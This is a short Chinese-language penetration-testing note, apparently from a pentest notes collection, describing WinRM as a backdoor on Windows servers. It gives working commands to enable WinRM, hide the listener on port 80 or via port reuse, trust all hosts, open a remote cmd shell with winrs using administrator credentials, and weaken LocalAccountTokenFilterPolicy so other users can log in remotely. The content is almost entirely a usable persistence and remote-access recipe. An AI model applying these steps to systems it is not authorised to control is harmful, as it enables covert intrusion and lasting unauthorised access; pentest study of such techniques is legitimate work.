	WinRM端口5985，win2012以上默认启动，2008开启命令
	>winrm quickconfig -q
	2012启用端口复用
	>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
	2008启用WinRM后修改端口为80
	>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
	后门连接和使用
	本地开启WinRM并设置信任连接主机
	>winrm quickconfig -q
	>winrm set winrm/config/Client @{TrustedHosts="*"}
	执行命令
	>winrs -r:http://10.1.1.100 -u:administrator -p:password ipconfig /all
	获取cmdshell
	>winrs -r:http://10.1.1.100 -u:administrator -p:password cmd
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/456.png)

	只administrator允许远程登录WinRM，允许其他用户可以登录，执行注册表
	>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f